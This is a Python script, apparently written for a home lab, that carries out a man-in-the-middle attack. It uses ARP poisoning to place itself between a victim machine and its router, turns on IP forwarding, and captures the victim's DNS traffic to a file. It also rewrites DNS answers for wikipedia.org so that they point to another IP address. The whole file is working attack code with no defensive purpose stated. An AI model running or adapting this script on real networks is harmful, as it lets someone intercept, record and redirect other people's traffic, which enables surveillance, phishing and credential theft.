from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *
import os
import time
import threading

def mac_addr_discovery():

    ## Discovering MAC Address of Victim Machine and Router

    print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.203')
    broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_layer1 = ARP(pdst = '192.168.0.203')
    entire_packet1 = broadcast1 / arp_layer1
    answer1 = srp(entire_packet1, timeout = 2, verbose = True, iface = "enp0s3")[0]

    time.sleep(2)

    print('Figuring out Mac Address of default gateway router with IP address of 192.168.0.1')
    broadcast2 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_layer2 = ARP(pdst = '192.168.0.1')
    entire_packet2 = broadcast2 / arp_layer2
    answer2 = srp(entire_packet2, timeout = 2, verbose = True, iface = "enp0s3")[0]

    victim_mac_addr = answer1[0][1].hwsrc
    router_mac_addr = answer2[0][1].hwsrc
    return victim_mac_addr, router_mac_addr

def poison(victim_pkt, router_pkt):
    print("Starting ARP poisoning loop...")
    while True:

        print('corruping victim')
        send(victim_pkt, verbose = False, iface = "enp0s3")
        
        time.sleep(5)

        print('corrupting router')
        send(router_pkt, verbose = False, iface = "enp0s3")

def packet_listener(packet):
    targetDomain = b'wikipedia.org'
    scapy_packet = IP(packet.get_payload())


    if(scapy_packet.haslayer(DNSRR)):
        print("DNS RESPONSE")
        dns_response = scapy_packet[DNS]

        qname = scapy_packet[DNSQR].qname
        print(qname)

        for x in range(dns_response.ancount):
            print (dns_response[DNSRR][x].rdata)


        if targetDomain in qname:
            print(f"[+] Sppofing DNS RESPONSE for {qname.decode()}")

            response = DNSRR(rrname = qname, rdata = "208.65.153.238")
            scapy_packet[DNS].an = response
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len 
            del scapy_packet[IP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
    print("in here?")

    def filterPkt(pkt):
        return pkt.haslayer(DNS) and Ether in pkt and (
            (pkt[Ether].src == victim_mac_addr and pkt[Ether].dst == attacker_mac_addr) or
            (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == router_mac_addr) or 
            (pkt[Ether].src == router_mac_addr and pkt[Ether].dst == attacker_mac_addr)  or
            (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == victim_mac_addr) 
        )


    pkts = sniff(lfilter = filterPkt, iface = "enp0s3")
    f = open('file.txt', "w")
    f.write(str(pkts))

def main():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    ether = Ether()
    attacker_mac_addr = ether.src

    victim_mac_addr, router_mac_addr = mac_addr_discovery()
    print(f"Victim MAC: {victim_mac_addr}")
    print(f"Router MAC: {router_mac_addr}")
    print(f"Attacker MAC: {attacker_mac_addr}")

    victim_pkt = ARP(op=2, hwdst = victim_mac_addr, pdst='192.168.0.203', psrc='192.168.0.1')
    router_pkt = ARP(op=2, hwdst = router_mac_addr, pdst='192.168.0.1', psrc='192.168.0.203')

    threading.Thread(target=packet_sniff, args = (victim_mac_addr, router_mac_addr, attacker_mac_addr), daemon = True).start()
    threading.Thread(target=poison, args=(victim_pkt, router_pkt), daemon=True).start()

    queue = nfq()
    queue.bind(1, packet_listener)
    queue.run()


if __name__ == "__main__":
    main()

